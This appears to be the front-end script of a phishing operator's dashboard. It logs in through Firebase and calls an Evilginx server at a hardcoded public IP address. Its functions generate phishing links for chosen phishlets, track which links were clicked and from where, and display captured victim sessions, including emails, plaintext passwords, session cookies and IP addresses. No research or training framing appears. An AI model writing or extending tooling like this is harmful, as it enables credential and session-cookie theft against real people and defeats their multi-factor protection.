console.log("✅ script.js loaded successfully");

// Set your Evilginx server (update with your actual domain or public IP and port)
const EVILGINX_SERVER = "http://3.149.242.245:5000";

// Wait for Firebase to load before executing functions.
document.addEventListener("DOMContentLoaded", function () {
  if (typeof firebase === "undefined") {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
    return;
  }
  checkAuthStatus();
  
  // Attach login event if not already attached
  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", login);
  }
});

// Check Authentication Status and Redirect Accordingly
function checkAuthStatus() {
  firebase.auth().onAuthStateChanged(function (user) {
    if (user) {
      console.log("✅ User logged in:", user.email);
      if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
        window.location.href = "dashboard.html";
      }
    } else {
      console.log("❌ User not logged in.");
      if (window.location.pathname.endsWith("dashboard.html") || window.location.pathname.endsWith("dashboard2.html")) {
        window.location.href = "index.html";
      }
    }
  });
}

// Login Function
function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }

  firebase.auth().signInWithEmailAndPassword(email, password)
    .then(function (userCredential) {
      console.log("✅ Login successful:", userCredential.user.email);
      window.location.href = "dashboard.html";
    })
    .catch(function (error) {
      console.error("❌ Login failed:", error.message);
      document.getElementById("loginError").innerText = error.message;
    });
}

// Logout Function
function logout() {
  firebase.auth().signOut().then(function () {
    console.log("✅ User logged out.");
    window.location.href = "index.html";
  }).catch(function (error) {
    console.error("❌ Logout failed:", error.message);
  });
}

// --------------------- Evilginx API Integration ---------------------

// Generate a generic Evilginx phishing link.
function generateLink() {
  fetch(`${EVILGINX_SERVER}/generate_link`)
    .then(function (response) { return response.json(); })
    .then(function (data) {
      if (data.link) {
        console.log("✅ Link generated:", data.link);
        alert("Phishing Link: " + data.link);
      } else {
        console.error("❌ Failed to generate link:", data);
        alert("Failed to generate link.");
      }
    })
    .catch(function (error) {
      console.error("❌ Error generating link:", error);
      alert("Error generating link. Check Evilginx server.");
    });
}

// Generate a phishing link for a specific phishlet (for Dashboard2)
function generatePhishletLink(phishlet) {
  const url = `${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`;
  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.link) {
        console.log("✅ Generated link for", phishlet, ":", data.link);
        document.getElementById("phishletLink").innerHTML =
          `Generated Link for ${phishlet}: <a href="${data.link}" target="_blank">${data.link}</a>`;
      } else {
        console.error("❌ Failed to generate link for", phishlet, data);
        alert("Failed to generate link for " + phishlet);
      }
    })
    .catch(error => {
      console.error("❌ Error generating phishlet link:", error);
      alert("Error generating phishlet link for " + phishlet);
    });
}

// Fetch and display captured sessions from Evilginx
function viewCapturedSessions() {
  fetch(`${EVILGINX_SERVER}/captured_sessions`)
    .then(function (response) { return response.json(); })
    .then(function (data) {
      let tableBody = document.getElementById("capturedSessions");
      tableBody.innerHTML = ""; // Clear previous data
      data.forEach(function (session) {
        let row = `<tr>
                      <td>${session.email}</td>
                      <td>${session.password}</td>
                      <td>${session.cookies}</td>
                      <td>${session.ip}</td>
                   </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Captured sessions loaded successfully.");
    })
    .catch(function (error) {
      console.error("❌ Error fetching captured sessions:", error);
      alert("Error fetching captured sessions.");
    });
}

// Fetch and display generated links history from Evilginx
function viewGeneratedLinks() {
  fetch(`${EVILGINX_SERVER}/generated_links`)
    .then(function (response) { return response.json(); })
    .then(function (data) {
      let tableBody = document.getElementById("generatedLinks");
      tableBody.innerHTML = ""; // Clear previous data
      data.forEach(function (link) {
        let row = `<tr>
                      <td>${link.url}</td>
                      <td>${link.clicked_location}</td>
                      <td>${link.ip}</td>
                   </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Generated links history loaded successfully.");
    })
    .catch(function (error) {
      console.error("❌ Error fetching generated links:", error);
      alert("Error fetching generated links history.");
    });
}
